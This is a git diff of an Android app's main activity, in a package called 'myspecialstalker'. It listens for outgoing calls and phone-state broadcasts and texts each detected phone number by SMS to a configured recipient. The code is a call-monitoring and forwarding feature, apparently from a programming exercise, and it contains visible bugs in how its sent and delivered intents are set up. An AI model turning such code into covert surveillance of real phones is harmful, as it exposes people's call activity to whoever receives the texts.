@@ -1,15 +1,26 @@
 package com.example.myspecialstalker;
 
 import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.PendingIntent;
+import android.arch.lifecycle.MutableLiveData;
+import android.arch.lifecycle.Observer;
 import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
+import android.os.AsyncTask;
+import android.os.Build;
+import android.provider.Telephony;
 import android.support.annotation.NonNull;
+import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
+import android.support.v4.app.NotificationCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.telephony.SmsManager;
@@ -25,13 +36,16 @@ public class MainActivity extends AppCompatActivity {
     public static final String SHARED_PREFS = "sharedPrefs";
     public static final String PHONE_NUMBER = "phoneNumber";
     public static final String MESSAGE = "message";
+    public static final String CHANEL_ID = "default";
+    public static final String DELIVERED = "message delivered successfully!";
+    public static final String SENT = "message sent successfully!";
 
     private String phoneNumber;
     private String message;
     private EditText editText_phone;
     private EditText editText_message;
     private TextView textView;
-    BroadcastReceiver br = new MyBroadcastReceiver();
+    MyBroadcastReceiver br = new MyBroadcastReceiver();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -41,7 +55,8 @@ public class MainActivity extends AppCompatActivity {
         editText_phone = findViewById(R.id.field1_result);
         editText_message = findViewById(R.id.field2_result);
         textView = findViewById(R.id.ready_text);
-        
+
+        initChannels(this);
         onRequestPermissionResult();
         loadData();
         listenForChangeInField(editText_phone,PHONE_NUMBER); // check for changes in phone number
@@ -49,11 +64,30 @@ public class MainActivity extends AppCompatActivity {
         checkIfAppIsReady(); // app is ready when both fields are filled in
         InitBroadcastReceiver();
         sendMessage();
+
+
+
+
+    }
+    public void initChannels(Context context) {
+        if (Build.VERSION.SDK_INT < 26) {
+            return;
+        }
+        NotificationManager notificationManager =
+                (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+        NotificationChannel channel = new NotificationChannel(CHANEL_ID,
+                "Channel name",
+                NotificationManager.IMPORTANCE_HIGH);
+        channel.setDescription("Message status");
+        notificationManager.createNotificationChannel(channel);
     }
 
     private void InitBroadcastReceiver() {
         IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
         filter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
+        filter.addAction("android.intent.action.PHONE_STATE");
+//        filter.addAction(SENT);
+//        filter.addAction(DELIVERED);
         registerReceiver(br, filter, Manifest.permission.PROCESS_OUTGOING_CALLS,null);
     }
 
@@ -107,15 +141,44 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void sendMessage(){
-        String number = getIntent().getStringExtra("Phone number");
-        if(number != null){
-            Log.d("TAG", "tel:" + number);
-            String message = editText_message.getText().toString();
-            PendingIntent pi = PendingIntent.getActivity(this, 0,
-                    new Intent("message sent"), 0);
-            SmsManager sms = SmsManager.getDefault();
-            sms.sendTextMessage(editText_phone.getText().toString(), null, message+" "+number, pi, null);
-        }
+        Log.d("TAG", "sendMessage: reached here");
+//        String number = getIntent().getStringExtra("Phone number");
+
+        final Intent sentIntent = new Intent(this, MyService.class);
+        sentIntent.setAction(SENT);
+        final PendingIntent sentPI = PendingIntent.getService(this, 0, sentIntent, 0);
+
+        final Intent deliverIntent = new Intent(this, MyService.class);
+        sentIntent.setAction(DELIVERED);
+        final PendingIntent deliveredPI = PendingIntent.getBroadcast(this, 0,
+                deliverIntent, 0);
+
+//        if(number != null){
+//            String message = editText_message.getText().toString();
+//            SmsManager sms = SmsManager.getDefault();
+//            sms.sendTextMessage(editText_phone.getText().toString(), null, message+" "+number, sentPI, deliveredPI);
+//            startService(sentIntent);
+//            startService(deliverIntent);
+//        }
+
+        br.getBroadcastLiveData().observe(this, new Observer<String>() {
+            @Override
+            public void onChanged(@Nullable final String s) {
+                AsyncTask.execute(new Runnable() {
+                    @Override
+                    public void run() {
+                        Log.d("phone number", "onChanged: "+s);
+                        SmsManager sms = SmsManager.getDefault();
+                        sms.sendTextMessage(editText_phone.getText().toString(), null,
+                                message+" "+s, sentPI, deliveredPI);
+                        startService(sentIntent);
+                        startService(deliverIntent);
+                    }
+                });
+
+            }
+        });
+
     }
     @Override
     protected void onDestroy() {
@@ -131,11 +194,10 @@ public class MainActivity extends AppCompatActivity {
 
         if (!checkPermissionsHelper(permissions)) {
             ActivityCompat.requestPermissions(this, permissions, PERMISSION_ALL);
-            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.SEND_SMS)) {
-            }
+            ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.SEND_SMS);
+
         }
     }
-
 
     public boolean checkPermissionsHelper(String... permissions){
         for (String permission : permissions) {
@@ -146,4 +208,7 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
+
 }
+
+//todo: shutdown channel. maybe shutdown service
